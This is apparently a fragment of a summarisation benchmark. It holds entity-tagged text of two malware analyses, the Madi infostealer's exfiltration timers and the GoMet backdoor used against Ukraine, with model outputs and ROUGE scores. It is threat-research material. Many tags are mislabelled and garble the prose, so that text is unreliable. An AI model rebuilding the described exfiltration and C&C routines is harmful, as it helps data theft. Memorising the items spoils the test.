extension is appended to their original name . Many files are used to monitor the exfiltration status of the executables . However , [ORG] Timer [ORG] 29 does n't actually seem to exfiltrate anything , probably because of bugs . Timer 9 : Check for files ready to be uploadedInterval : [CARDINAL] 5 secondsTimer [CARDINAL] 9 is disabled . If either [ORG] Timer [ORG] 19 or [ORG] Timer [ORG] 20 is enabled , it means there is already an active exfiltrating task . [LAW] Timer [LAW] 9 is enabled and it returns . Otherwise , [ORG] Timer [ORG] 9 searches for files * .*KILOP as well as * .htm . [ORG] BMH * files in the malware directory . KILOP files are [PERSON] Base64 encoded versions of files to exfiltrate . If no file is found , [LAW] Timer [LAW] 9 is enabled and returned . If files are present , they are ready to be exfiltrated , and [ORG] Timer [ORG] 19 is enabled . Before returning , [LAW] Timer [LAW] 9 is enabled . Timer 19 : Check if IE instrumentation has been used to visit the upload page . Interval : [CARDINAL] 25 secondsTimer [CARDINAL] 19 searches for a specific page title : If the page title \" new title hastam - Microsoft Internet Explorer \" is found , [LAW] Timer [LAW] 19 returns . \"OKshodiha - Windows Internet Explorer \" means a file is ready to be uploaded \u2013 [ORG] Timer [ORG] 20 is enabled andreturns . If none of those captions are found , [ORG] Timer [ORG] 19 starts IE_Instrumentation and visits the Sendfilejj.html page , enables [LAW] Timer [LAW] 20 , then returns . [LAW] Timer [LAW] 20 : File uploadTimer 20 searches for * .*KILOP files , computes the [ORG] BOTID ( see [LAW] Timer [LAW] 1 for details ) , and fills the [ORG] POST parameters . The \" S0 \" , \" S1 \" and \" S2 \" forms present in the Sendfilejj.html are \" filled \" and the file is uploaded using IE Instrumentation . T3 , is the BOTID+Folder used for uploading ( see [ORG] below)T2 is the file [ORG] nameT1 is the [GPE] Base64 encoded content of the file . To compute [PRODUCT] T3 , the following folder is appended to the [ORG] BOTID ( each victim has a root folder named after the [ORG] BOTID on the C&C).\"/Pi/ \" for .jpg . [ORG] BMH - Screen Captures\"Te/ for .htm . [ORG] BMH - Keylogger logs\"/So/ for .wav . [ORG] BMH - Audio Recordings\"/Fi/ \" for important.file . [ORG] BMH / Fi / CoolDisk/ \" for .fildik . [ORG] BMH ( data stolen from removable drives)Files are sent via the Sendfilejj.html page hosted on the [ORG] C&C , which is a wrapper for the \" sik.php \" script used to receive exfiltrated data . Timer 5 : [PERSON] Base64 encoder for exfiltrated dataInterval : [CARDINAL] 1 millisecondWhen triggered , it disables [ORG] Timer [ORG] 5 , searches for * .*BMH files ( files that will be exfiltrated once [PERSON] Base64 encoded ) in the malware folder . When [CARDINAL] one file is found , it checks if the file is indeed on the disk and accessible . It [PERSON] Base64 encodes it and saves it as nameoffile . BMH.KILOP . The non encoded version ( BMH)is deleted , [ORG] Timer [ORG] 5 is re - enabled and it returns . Files are handled [CARDINAL] one by one , but the timer interval is very small , therefore it 's almost instantaneous . Note : The resulting encoded files are those handled by [ORG] Timer [ORG] 20 described above . The process occurs as follows : [ORG] Timer [ORG] 9 enables Timer 19 , which enables [LAW] Timer [LAW] 20 to upload files generated by [ORG] Timer [ORG] 5.Timer [ORG] 21 : [ORG] Filesend.xls parserFilesend.xls has a list of files to exfiltrate . Upon execution , [ORG] Timer [ORG] 21 is disabled . If \" filesend.xls \" is present , it is opened and read . All the files to be exfiltrated are separated by the \" * \" character as in the example below:*C : Documents and Settings%USER%Desktoptoolsstealme.txt**C : Documents and Settings%USER%Desktoptoolsstealme2.txt*Timer 21 parses each entry , and will check whether the file exists . If it does , a copy of the file will be made in the malware directory with a .file . BMH extension . ( In my example , we have : \" stealme.txt.file . BMH\".)Timer [CARDINAL] 10 : Tracking what was uploaded and cleaning IE instrumentation pagesWhen a file has been uploaded using [ORG] Timer [ORG] 20 , a [ORG] POST is made to the sik.php file , a page is returned containing the name of the uploaded file , as well as the hardcoded string \" Save Shode \" as you can see on the screen capture below : [ORG] Timer [ORG] 10 is responsible for keeping track of some of the uploaded files . Exfiltrated files are added to the \" rafteha.zip \" , which lists the files that have already been handled . The last file path to be handled is saved to the \" fileomade.xls \" file . [LAW] Timer [LAW] 15 : Check for \" filesend.xls\"Timer 15 is disabled upon execution and \" filesend.xls \" is sought . If present , [ORG] Timer [ORG] 15 is enabled and it returns . If not , it checks whether [ORG] Timer [ORG] 1 is enabled . If [ORG] Timer [ORG] 1 is enabled , it enables [LAW] Timer [LAW] 15 and returns . If [ORG] Timer [ORG] 1 is n't enabled , [LAW] Timer [LAW] 15 checks the status of [ORG] Timer [ORG] 18 . If it is enabled , [LAW] Timer [LAW] 15 re - enables itself and returns . If \" filesend.xls \" is n't present and both [ORG] Timer [ORG] 1 and [ORG] Timer [ORG] 18 are disabled , it creates a \" [WORK_OF_ART] pangtkp.bat \" file , which contain \" ping [WORK_OF_ART] C&C_IP > C : DOCUME~1%USER%TEMPLA~1iexplore.exe.pkklm\" . That bat is executed , and both [ORG] Timer [ORG] 1 and 5 are enabled before returning . There are other timers that are in some way or other related to exfiltration and data stealing , but they are all fairly similar . There is a lot of redundancy in the malware . Timer 23 : List all removable drives on the machineTimer 23 lists all the removable drives on the machine , enables [ORG] Timer [ORG] 24 , [ORG] Timer [ORG] 23 disables itself and returns . [LAW] Timer [LAW] 24 : Search and copy files from removable drivesTimer [CARDINAL] 24 receives the list of removable drives computed by [ORG] Timer [ORG] 23 , and searches all the files on the devices . Stolen files will be copied to the malware directory with fildik . BMH extensions , which will later be encoded as fildik . BMH.KILOP ( Base64 ) and exfiltrated . The list of processed files are stored inside raftehacool.zip . [ORG] MiscellaneousThe infostealer contains [CARDINAL] 52 timers . Some of them do not perform any important tasks . The authors decided to ping the [ORG] C&C server and save the results under specific file names . Those files are checked and parsed in order to find out if the [ORG] C&C is up and if certain actions can be taken . This is pretty amateurish programming . [LAW] Timer [LAW] 44 : simple ping via [DATE] pangtipo.batTimer [DATE] 44 is disabled upon execution . [LAW] Timer [LAW] 44 checks whether [ORG] Timer [ORG] 45 is enabled and returns if it is . ( [ORG] Timer [ORG] 44 is enabled prior to returning . ) If [LAW] Timer [LAW] 45 is disabled , a \" pangtipo.bat \" file is created , which contains \" ping [WORK_OF_ART] C&C_IP > C : DOCUME~1%USER%TEMPLA~1iexplore.exe.pkxml\" . The bat file is executed , [ORG] Timer [ORG] 44 is enabled and [LAW] Timer [LAW] 44 returns . [LAW] Timer [LAW] 11 : Simple ping from [DATE] pangtip.batTimer [DATE] 11 is disabled upon execution . If [ORG] Timer [ORG] 16 is already enabled , [LAW] Timer [LAW] 11 re - enables itself and returns . If [ORG] Timer [ORG] 17 is already enabled , [LAW] Timer [LAW] 11 re - enables itself and returns . If none of the timers are enabled , it creates the \" pangtip.bat \" file , which contains \" ping [WORK_OF_ART] C&C_IP > C : DOCUME~1%USER%TEMPLA~1iexplore.exe.pkxm \" and executes it via [ORG] ShellExecute . Timer 16 is enabled and returns . Note : Timers 1 , [DATE] 7 , [DATE] 11 , [DATE] 15 , [DATE] 44 and [CARDINAL] 48 generate these batch files under different names and the results are saved under different names too . Timer 7 : Was \" timeip.php \" visited?Timer [CARDINAL] 7 is disabled upon execution . [ORG] Timer [ORG] 7 checks whether the timeip.php page was visited . If not , it visits the page using IE instrumentation , [ORG] Timer [ORG] 7 disables itself and enables [ORG] Timer [ORG] 8 ( see description below).It creates the \" pangip.bat \" file , which contain \" ping C&C_IP \" . Results are saved as \" iexplore.exe.pkam\" . Note : the file name used to save the output of the ping commands is based on the infostealer executable name , which is \" iexplore.exe \" . If the executable is renamed , the log files will have different names . [ORG] Timer [ORG] 8 : Parse the results of the timeip.php visitThe timeip.php script returns the current time and the [ORG] IP address of the victim . The results of the visit ( done with IE instrumentation in [ORG] Timer [ORG] 7 ) are saved into a buffer which is used during the keylogger log creation ( see [LAW] Timer [LAW] 4 description).Timer [CARDINAL] 22 : Ensure there is a backup copy of [ORG] UpdateOffice ( downloader)Note : The downloader is the only malware that starts after Windows boots . It 's therefore important to ensure various backup copies are made . [LAW] Timer [LAW] 22 checks if \" UpdateOffice.exe \" is present in the infostealer directory ( templates ) . It should n't be , as it is only present in the printhood directory . ( See Downloader description at the beginning of the article.)Since it is not present , it calls a subroutine to get the path to the \" [ORG] Printhood \" directory ( GetSpecialFolderLocation with CSIDL_PRINTHOOD parameter ) . While concatenating the \" UpdateOffice.exe \" and the \" [ORG] Printhood \" folder , the \" \" character is missing , and therefore , the routine is bugged . The returned string is : \" C : Documents and Settings%USER%PrintHoodUpdateOffice.exe \" insteadof \" C : Documents and Settings%USER%PrintHoodUpdateOffice.exe\" . It then copies ( or at least tries to , as the path is wrong ) \" C : Documents and Settings%USER%PrintHoodUpdateOffice.exe \" as \" srAntiq.dll \" in the [ORG] Templates folder . If \" OfficeUpdate.exe \" is n't present in the \" printhood \" , a copy is made from \" srAntiq.dll\" . It retrieves the path to the Startup Folder using the CSIDL_STARTUP : \" C : Documents and [ORG] Settings%USER%Start [ORG] MenuProgramsStartup\" . [LAW] Timer [LAW] 22 checks whether \" [ORG] OfficeUpdate.exe \" is present in that folder ; if not , it will make a copy of srAntiq.dll to the [PRODUCT] Startup folder and returns from [ORG] Timer 22.Timer [CARDINAL] 25 : Check for \" fsdiskget.dll\"Timer [CARDINAL] 25 checks if \" fsdiskget.dll \" is present in the malware directory ; if not , it returns . If the file is present , it enables [LAW] Timer [LAW] 23 ( see the [ORG] Data [ORG] Stealing section for a description).Timer [CARDINAL] 42 : lbdiskgo.dll , soltanik.dll and res.exe checkingTimer [CARDINAL] 42 checks whether a flag ( set by [ORG] Timer [ORG] 34 and cleared by [ORG] Timer [ORG] 33 ) is set to 0 and if lbdiskgo.dll , soltanik.exe and res.exe are present . If they are , it enables [ORG] Timer [ORG] 33 ; otherwise , it returns . Timer 43 : lbdiskgo.dll / ladine.dll / res.exe checkingTimer 43 returns directly if neither \" lbdiskgo.dll \" or \" ladine.dll \" are present . If res.exe is present , it enables [ORG] Timer [ORG] 44 and [ORG] Timer [ORG] 48 ; otherwise , it returns . [LAW] Timer [LAW] 45 : Visit the ReReReRe.htm pageTimer 45 deletes pangtipo.bat , reads iexplore.pkxml to make sure the [ORG] C&C replied . ( [ORG] Timer [ORG] 1 and [ORG] Timer [ORG] 16 provides some more details on the use of such .bat files.)Uses FindWindow to check whether [ORG] IE [ORG] Instrumentation has been used to visit the special ReReReRe.html page , which contains the following title : \" r!r!r!r!\" . It looks for different variants such as \" r!r!r!r ! - Windows Internet Explorer \" or \" r!r!r!r ! - Microsoft Internet Explorer\" . If [CARDINAL] one of them is found , it means the page was visited using IE instrumentation . It disables [LAW] Timer [LAW] 45 and returns . If none of them are found , [ORG] Timer [ORG] 45 will visit the URL url enable [LAW] Timer [LAW] 46 ( see below ) , disable [LAW] Timer [LAW] 45 and return . [LAW] Timer [LAW] 46 : Parse \" ReReReRe.htm \" ( downloaded by [ORG] Timer 45)Timer 46 goes through all the different running instances of instrumented IE , looking at the title of each [ORG] HTM page . The main interest here is \" r!r!r!r!\" . This page is the ReReReRe.htm file downloaded by [ORG] Timer [ORG] 45 . [LAW] Timer [LAW] 46 looks for a special EOF ( End Of File ) marker : \" tamamshodfile \" . This marker is used by the infostealer to make sure the htm page was fully downloaded . Once the page has been confirmed as valid , it looks for the textarea i d S1 which holds double [PERSON] Base64 encoded [PERSON] PE [PERSON] Files . The [PERSON] Base64 encoded data is saved as : ASLASLKK223.dll . [LAW] Timer [LAW] 47 : Double decoding of [PERSON] Base64 encoded payload from ReReReRe.htmNote : [ORG] Timer [ORG] 46 saves the payload as ASLASLKK223.dll . Since the payload file is double encoded , the decoding is performed in [CARDINAL] two steps : ASLASLKK223.dll is decoded to ASLASLKK224.dll to get a single encoded [PERSON] Base64 file . ASLASLKK224.dll is decoded to \" res.exe \" : [ORG] Final [ORG] PE file.Res.exe is a copy of the [ORG] Resource [ORG] Hacker utility . ASLASLKK224.dll is deleted . The use of Res.exe is described in the analysis of [LAW] Timer [LAW] 39 below . Once [ORG] Timer [ORG] 47 has finished enumerating all the IE instances , it will call a cleaning routine . It searches for \" - r!r!r!r ! - Windows Internet Explorer \" and different variants described in [ORG] Timer [ORG] 45 and sends a \" WM_Close \" [WORK_OF_ART] Message [WORK_OF_ART] to [WORK_OF_ART] IE [WORK_OF_ART] Windows in order to close them . Among all those captions , it also searches for \" - 404 - File or directory not found . \" and variants of [CARDINAL] 404 pages . Once the cleaning is completed , [ORG] Timer [ORG] 47 disables itself and returns . [LAW] Timer [LAW] 49 : Visit the SeSeSeSe.htm pageTimer 49 is almost identical to [ORG] Timer [ORG] 45 . The only difference is the page visited : SeSeSeSe.htm instead of ReReReRe.htmSee the Timer 45 description for details . [LAW] Timer [LAW] 50 : [ORG] Parse \" SeSeSeSe.htm \" ( downloaded by [ORG] Timer 49)Timer 50 is almost identical to [LAW] Timer [LAW] 46 . The only difference is the page parsed : SeSeSeSe.htm instead of ReReReRe.htm and local file names . The double encoded payload is saved as \" ASLASLKK2231.dll\" . See the Timer 46 description for details . [LAW] Timer [LAW] 51 : Double decoding of [PERSON] Base64 encoded payload from SeSeSeSe.htmNote : Timer 50 saves the payload as [PERSON] ASLASLKK2231.dll . Since the payload file is double encoded , the decoding is performed in [CARDINAL] two steps : [PERSON] ASLASLKK2231.dll is decoded to [GPE] ASLASLKK2241.dll to get a single encoded [PERSON] Base64 file . [GPE] ASLASLKK2241.dll is decoded to \" [ORG] Ladine.dll \" : final [ORG] PE file . Note : At the time of writing , the SeSeSeSe.htm page had been removed from the [ORG] C&C server . A [ORG] C&C server used by older variants of the infostealer is still available and the old page name was \" SSSS.htm \" . The embedded file is a template of a downloader executable ( see [LAW] Timers [LAW] 35 , [DATE] 36 , [DATE] 37 , [DATE] 38 and [DATE] 39 for further information).Once [LAW] Timer [LAW] 51 has finished enumerating all the IE instances , it will call a cleaning routine . It searches for \" - s!s!s!s ! - Windows Internet Explorer \" and different variants described in [ORG] Timer [ORG] 45 , and sends a \" WM_Close \" [WORK_OF_ART] Message [WORK_OF_ART] to [WORK_OF_ART] IE [WORK_OF_ART] Windows in order to close them . Among all those captions , it also searches for \" - 404 - File or directory not found . \" and variants of [CARDINAL] 404 pages . Once the cleaning is completed , [ORG] Timer [ORG] 51 disables itself and returns . BETA / NON - WORKING [ORG] FEATURES : New executable generationThere are a few timers in the infostealer that are related to a missing file . I managed to find a copy of the missing file from an older command and control server , in order to understand the intentions of the authors . The missing file is downloaded by [LAW] Timer [LAW] 50 : SeSeSeSe.htm . It 's not present on the current [ORG] C&C servers . If we were to replace the SeSeSeSe.htm with an old copy ( originally SSSS.htm ) , [ORG] Timer [ORG] 51 would produce a file called \" Ladine.dll \" , which is a template executable of the [GPE] Trojan downloader used to install the infostealer . Timer 52 : Copy Ladine.dll to \" Soltanik.exe\"Timer [CARDINAL] 52 makes a copy of \" Ladine.dll \" under the name \" soltanik.exe \" , which is the template file . Timer 35 : Clean files from [ORG] Timer [ORG] 39Timer [ORG] 35 is disabled . A special [ORG] BOTID is created by concatenating \" CoolDiskGo ( \" with \" BOTID_TMP ) \" , e.g. : [CARDINAL] CoolDiskGo(MYCOMPUTER-8712422C6C7704EF)Timer [CARDINAL] 35 puts the [ORG] C&C [ORG] IP address in a global variable that will be used by [ORG] Timer 38.Timer [CARDINAL] 35 tries to delete the following several files created by [LAW] Timer [LAW] 39 : [CARDINAL] 1.txt , res.ini , res.log , [GPE] Icon_1.ico , output.rc and server.exe . It does several other things which are not relevant to what I describe here , so I 've omitted any reference to those actions . [ORG] Timer [ORG] 36 is enabled before returning . [LAW] Timer [LAW] 36 : Enable Timer 37 if [CARDINAL] 1.txt is n't found - logic / code [LAW] bugTimer [LAW] 36 is disabled upon execution . If \" [CARDINAL] 1.txt \" is n't present , [ORG] Timer [ORG] 37 is enabled . Otherwise , it calls a Base64 decoding function . [CARDINAL] 1.txt must be a valid [PERSON] Base64 encoded stream of bytes ; otherwise , an exception occurs and [ORG] Timer [ORG] 36 returns . [ORG] Timer [ORG] 37 : Update resource for the template downloader : Soltanik.exeTimer 37 is disabled upon execution . A structure exception handler is installed before reading [CARDINAL] 1.txt . In the event of an exception the [ORG] SEH handler will enable [LAW] Timers [LAW] 42 , [DATE] 34 , [DATE] 33 , [DATE] 35 , and [ORG] Timer [ORG] 37 will return . [ORG] Timer [ORG] 37 expects [CARDINAL] 1.txt to be present and here is the logic bug . [LAW] Timer [LAW] 37 is only enabled when [CARDINAL] 1.txt is n't present , by [ORG] Timer [ORG] 36 . Let 's ignore the reasons for its creation and continue analyzing the intentions of the authors . [ORG] Timer [ORG] 37 calls the [ORG] BeginUpdateResource ( with the bDeleteExistingResources parameter set to [CARDINAL] 0 ) , and start updating the resources of the template executable ( soltanik.exe ) in RCDATA.A MAHDI entry is added , with the [GPE] Base64 content from [CARDINAL] 1.txt . This works in exactly the same way as the downloaders with social engineering features . [ORG] Timer [ORG] 38 is enabled , and [ORG] Timer [ORG] 37 returns . Note : At the end of [ORG] Timer [ORG] 37 , [GPE] Soltanik has been modified to have a new resource : MAHDI.Timer [CARDINAL] 38 : Update more resources from the template downloader ( Soltanik.exe)Several entries are added to [ORG] RCDATA : Shelikn : Special BotID generated by [ORG] Timer [ORG] 35 [ORG] SiteW : [ORG] C&C [ORG] IP address Bind : Empty ( according to analysis of the downloaders that use social engineering , it should be the extension of the embedded file dropped to social engineering victims . If [ORG] MAHDI contains a [GPE] Base64 encoded picture , [ORG] Bind should be set to .JPG ) . Filee : SCR Roze : [CARDINAL] 0Once the resources have been updated , [ORG] Timer [ORG] 39 is enabled and [ORG] Timer [ORG] 38 returns . [LAW] Timer [LAW] 39 : Generate a final binary : [ORG] Server.exe with updated iconAt the end of [ORG] Timer [ORG] 38 , soltanik.exe has been fully updated with new resources . Upon execution , [ORG] Timer [ORG] 39 disables itself and starts generating a special command line for the Resource Hacker tool that was created as \" Res.exe \" by [ORG] Timer [ORG] 47.The command line is the following : There is a bug in the routine . An executable name is missing right after \" -extract\" . The command line dumps [ORG] the [ORG] Main [ORG] Icon to disk ( Icon_1.ico ) and creates a file called \" output.rc\" . At this point , it is impossible to know which file was meant to be used as the source of a new icon . For the sake of our analysis , let 's pretend the bug does n't exist and that a valid file name was provided . Afterwards , a [ORDINAL] second command line is passed to \" Res.exe\":This final command line will generate [ORG] Server.exe , a copy of soltanik.exe whose icon has been changed to the one extracted in the previous command.Server.exe is now fully updated . Its resources are filled , and its icon changed . It 's not clear why the authors did this , but despite all the bugs it was possible to understand the overall aim of the routine : to create a [ORG] Server.exe file from soltanik.exe with a new icon and added resources . What happens to [ORG] Server.exe ? Nothing , this is a non - working feature . It appears [GPE] Madi has the ability to generate new downloaders , at least , in theory . The [CARDINAL] 7 remaining timers wo n't be described as they are of little interest . ConclusionsIn this article we closely analyzed the infostealer used in the [GPE] Madi campaign . The coding style and the usage of [ORG] Delphi , together with the programming techniques indicate a rudimentary approach . Most of the data - stealing actions and communication with the [ORG] C&C servers take place via external files , which is rather messy . Whoever coded it is probably still reading through the [ORDINAL] first chapters of their [ORG] Delphi manuals . This is maybe why it is surprising to note its effectiveness , considering the data received from the sinkhole . During the monitored period , [MONEY] a [MONEY] little [MONEY] over [MONEY] 800 victims were connected to the servers . All of themfell prey to the various social engineering techniques used by the malware . To sum up , we can say the following : the components of the [GPE] Madi campaign are surprisingly unsophisticated no exploits or advanced [DATE] 0 - day techniques are used anywhere in the malware despite that , the overall success of the campaign is surprisingly high nevertheless , we should remember that even low quality malware can steal data [GPE] Madi was a low investment , high profit project its authors remain unknownWe will continue to monitor the [GPE] Madi malware and update you on our findings in the future .", "generated_text": "the Middle East; the infostealer; downloaders; Downloaders; the malware; nam.dll; the HTM; code; Delphi Timers; the malware; a keylogger; the system; a keylogger; the key; the information; a keystroke; the infostealer; the key; the installer; the payload; the C&C; the C&C server; the C&C; the user; the attacker; a list; the C&C server; commands; the C&C; the downloader; the C&C; a list; a list; the C&C server; the RAT; security.", "ref_text": "<START-1>The document analyzes the \"Madi\" malware campaign that has infected over 800 victims primarily in the Middle East by targeting Iran, Israel, and Afghanistan. - The malware is delivered via spearphishing emails containing malicious PDF attachments that install the malware if opened. - Two main components are installed - a dropper and a data-stealing module. The malware uses 52 timers to control its activities. - It captures keystrokes, screens, audio, scans drives, and exfiltrates documents and files back to its command and control servers. The data is encrypted and encoded. - The malware tracks infections via campaign IDs and logs system info like IP, OS, and machine name. It uses social engineering and fake files to avoid detection. - The coding techniques are basic and bugs exist, indicating amateur developers. But the campaign has still successfully compromised many targets. - Non-working features suggest the ability to generate new malware executables was being developed. The malware continues to be active and monitored. - While unsophisticated, the malware is effective at stealing data from infected systems. Low-tech malware remains a threat and this campaign in particular has had high success rates despite its simplicity. In summary, the document analyzes an active, low-tech but effective malware campaign targeting the Middle East that is stealing data from compromised systems. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.35211267605633806, "gpt3/lexical/rouge_rouge2": 0.06603773584905659, "gpt3/lexical/rouge_rougeL": 0.18779342723004697, "gpt3/lexical/rouge_rougeLsum": 0.18779342723004697, "gpt3_generated_text": ["This article provides a detailed analysis of the infostealer known as Madi, which has been used in a campaign to infiltrate computer systems in the Middle East. The infostealer is installed by various downloaders that trick users or simply download and install the malware. Both the infostealer and downloaders create fake files and drop additional files to assist the malware. The infostealer uses a file called nam.dll, which is created by the downloader and contains a prefix used when connecting to the command and control server (C&C). The downloaders connect to the C&C server to request an HTM page, which contains an executable embedded in the page. The infostealer is executed once downloaded. The infostealer is written in Delphi and has an Internet Explorer icon. It utilizes a large number of Delphi Timers and has numerous bugs. The first activity performed by the infostealer is the setup of a keylogger, which uses the Windows function \"SetWindowsHookEx\". The infostealer then reads the nam.dll file to get a prefix and concatenates it with the computer name to create a BOTID. The infostealer also disables several timers. The malware uses external files to receive commands, indicating poor programming skills. Overall, this article provides a comprehensive analysis of the Madi infostealer and its key features."]}, {"split_name": "val", "sample_id": "val_84", "prompt_text": "Extract the keywords: blog.talosintelligence.com /2022/07 / attackers - target - ukraine - using - gomet.html [NORP] Attackers target [GPE] Ukraine using [ORG] GoMet backdoorExecutive summarySince the [NORP] Russian invasion of [GPE] Ukraine began , [NORP] Ukrainians have been under a nearly constant barrage of cyber attacks . Working jointly with [NORP] Ukrainian organizations , [PERSON] Cisco [PERSON] Talos has discovered a fairly uncommon piece of malware targeting [GPE] Ukraine \u2014 this time aimed at a large software development company whose software is used in various state organizations within [GPE] Ukraine . We believe that this campaign is likely sourced by [NORP] Russian state - sponsored actors or those acting in their interests . As this firm is involved in software development , we can not ignore the possibility that the perpetrating threat actor 's intent was to gain access to source a supply chain - style attack , though at this time we do not have any evidence that they were successful . [PERSON] Cisco [PERSON] Talos confirmed that the malware is a slightly modified version of the open - source backdoor named \" GoMet . \" The malware was [ORDINAL] first observed on [DATE] March 28 , [DATE] 2022 . GoMet backdoorThe story of this backdoor is rather curious \u2014 there are [CARDINAL] two documented cases of its usage by sophisticated threat actors . [ORDINAL] First , in [DATE] 2020 , attackers were deploying this malware after the successful exploitation of CVE-2020 - 5902 , a vulnerability in [CARDINAL] F5 BIG - IP so severe that [ORG] USCYBERCOM posted a tweet urging all users to patch the application . The [ORDINAL] second is more recent and involved the successful exploitation of CVE-2022 - 1040 , a remote code execution vulnerability in Sophos Firewall.1/7Both cases are very similar . They both start with the exploitation of a public vulnerability on appliances where the malicious actors then dropped [ORG] GoMet as a backdoor . As of publishing time , [PERSON] Cisco [PERSON] Talos has no reason to believe these cases are related to the usage of this backdoor in [GPE] Ukraine . The original [ORG] GoMet author posted the code on [ORG] GitHub on [DATE] March 31 , [DATE] 2019 and had commits until [DATE] April 2 , [DATE] 2019 . The commits did n't add any features but did fix some code convention aesthetics . The backdoor itself is a rather simple piece of software written in the Go programming language . It contains nearly all the usual functions an attacker might want in a remotely controlled agent . Agents can be deployed on a variety of operating systems ( OS ) or architectures ( amd64 , arm , etc . ) . GoMet supports job scheduling ( via [ORG] Cron or task scheduler depending on the OS ) , single command execution , file download , file upload or opening a shell . An additional notable feature of [ORG] GoMet lies in its ability to daisy chain \u2014 whereby the attackers gain access to a network or machine and then use that same information to gain access to multiple networks and computers \u2014 connections from [CARDINAL] one implanted host to another . Such a feature could allow for communication out to the internet from otherwise completely \" isolated \" hosts . This version was changed by malicious actors , in the original code , the cronjob is configured to be executed once [TIME] every [TIME] hour on the hour . In our samples , the cronjob is configured to run [TIME] every [TIME] two [TIME] seconds . This change makes the sample slightly more noisy since it executes [TIME] every [TIME] two [TIME] seconds , but also prevents an hour - long sleep if the connection fails which would allow for more aggressive reconnection to the [ORG] C2.The objective of the cron job defined in the main part of the malware is to check if it 's connected to the C2 , if not it will start the agent component again and connect to the C2 . The picture below shows the execution flow of the [CARDINAL] C2 setup routine Agent . Start.2/7This flow reveals another change to the [ORG] GitHub versions . If the C2 is unreachable , the sample will sleep for a random amount of time [CARDINAL] between [CARDINAL] five [CARDINAL] and [CARDINAL] 10 [CARDINAL] minutes . GO 's sleep implementation uses nanoseconds . [WORK_OF_ART] The [WORK_OF_ART] Pseudo [WORK_OF_ART] Code would look like the following : time_Sleep(1000000000 * ( rnd_val + 300)).The ' WaitGroup_Add ' call in the disassembly screenshot can also be confusing . The trick is , the Go compiler is changing the source code [ORG] WaitGroup . [PERSON] Done ( ) to [ORG] WaitGroup . Add(-1).After the Agent.start routine is done , the next cron job triggered the execution of the serve ( ) routine and different configuration . If we look closely at the functions , they are not 100 % equal , but we can see that the changes are mainly strings and similar victim or compiler - dependent data , along with researcher comments . Below is the [ORG] Main . Main function as an example.5/7The malicious activity we detected included a fake [PRODUCT] Windows update scheduled tasks created by the [ORG] GoMet dropper . Additionally , the malware used a somewhat novel approach to persistence . It enumerated the autorun values and , instead of creating a new one , replaced one of the existing goodware autorun executables with the malware . This potentially could avoid detection or hinder forensic analysis . In [CARDINAL] one of the cases , [TIME] about [TIME] 60 [TIME] seconds before the schtask query is executed , a blank [ORG] CMD process is opened and then subsequently executes systeminfo and schtask queries rather than these queries being chain opened by svchost or services or another process . This execution looks like : C:\\WINDOWS\\system32\\cmd.exe 7)systeminfoschtasks /query /tn [NORP] microsoft\\windows\\windowsupdate\\scheduledschtasks /query /tn microsoft\\windows\\windowsupdate\\scheduled /v InfrastructureBoth samples have the command and control ( C2 ) IP address hardcoded , which is [DATE] 111.90.139[.]122 . Communication occurs via HTTPS on the default port.6/7The certificate on this server was issued on [DATE] April 4 , [DATE] 2021 as a self - signed certificate , with the preparation began [DATE] as [DATE] early [DATE] as [DATE] April [DATE] 2021 . At the moment , there are no known domains associated with this [ORG] IP address and the last time there was a domain associated with it was on [DATE] Jan. 23 , [DATE] 2021 , which is outside the known attack time frame . ConclusionAs the war in [GPE] Ukraine rages on with little resolution in sight , we are reminded that attackers will try just about anything to gain additional leverage over their [NORP] Ukrainian adversaries . [PERSON] Cisco [PERSON] Talos expects to see the continued deployment of a range of cyber weapons targeting the [NORP] Ukrainian government and its counterparts . We remain vigilant and are committed to helping [GPE] Ukraine defend its networks against such cyber attacks and working closely with our strategic allies in the region to gather and provide actionable threat intelligence . In this instance , we saw a software company targeted with a backdoor designed for additional persistent access . We also observed the threat actor take active steps to prevent detection of their tooling by obfuscating samples and utilizing novel persistence techniques . This access could be leveraged in a variety of ways , including deeper access or launching additional attacks , including the potential for software supply chain compromise . It 's a reminder that although the cyber activities have n't necessarily risen to the level many have expected , [GPE] Ukraine is still facing a well - funded , determined adversary that can inflict damage in a variety of ways \u2014 this is just the latest example of those attempts . We assess with moderate to high confidence that these actions are being conducted by [NORP] Russian state- sponsored actors or those acting in their interests . Open - source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on [ORG] Snort.org . Indicators of Compromise", "generated_text": "a software development company; use; state organizations; Ukraine; the malware; Russian; a backdoor; GoMet; the attackers; a remote code execution vulnerability; Sophos Firewall; the backdoor; a cron job; every hour; the C2; a cronjob; the agent; time; the C2; communication; the network; connections; IP; a cron; the C2; the agent; a shell; APT; The malware; GitHub; a cron job; the C2; server; a loader; the payload; part; the payload; a payload; a binary; a tuple; a payload; a sample; a tuple; a shell; a shell; the C2; the payload; a payload; a project; the payload; a command; a server; the payload; a shell; a command; the backdoor; the attacker; IP; the payload; a proxy; a string; a command; a backdoor; the malware.", "ref_text": "<START-1>The PDF discusses the use of a backdoor called GoMet to target a large Ukrainian software development company since the start of Russia's invasion. GoMet is an open-source backdoor written in Go that provides remote access capabilities. Though the threat actor is unknown, Cisco Talos assesses the campaign is likely by Russian state-sponsored groups or those aligned with their interests. As the targeted company makes software used across Ukrainian state organizations, the attackers may intend to compromise the supply chain. The PDF analyzes GoMet's functionality like command execution, file operations, and daisy chaining to other systems. It highlights modifications made to the public GoMet code in this campaign, like more aggressive reconnecting. Details are provided on the malware's activity, including fake Windows updates and novel persistence by replacing existing autorun values. The IP address 111.90.139[.]122 was identified as the hardcoded command and control server. The PDF concludes by emphasizing the variety of cyber threats facing Ukraine and the determination of Russia-aligned actors. It stresses the need for continued vigilance and support against such attacks. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5488126649076518, "gpt3/lexical/rouge_rouge2": 0.11140583554376658, "gpt3/lexical/rouge_rougeL": 0.24274406332453827, "gpt3/lexical/rouge_rougeLsum": 0.24274406332453827, "gpt3_generated_text": ["Attackers, likely Russian state-sponsored actors, have targeted a large software development company in Ukraine with the GoMet backdoor malware. The company's software is used in various state organizations within Ukraine, raising concerns of a potential supply chain-style attack. Although there is no evidence of a successful breach at this time, the attack highlights the ongoing cyber threat faced by Ukrainians since the Russian invasion. The GoMet backdoor, originally posted on GitHub in 2019, is a simple piece of software written in the Go programming language. It allows attackers to remotely control compromised systems, with features such as job scheduling, file download/upload, and shell access. Notably, GoMet also supports daisy chaining, enabling attackers to move laterally across networks. 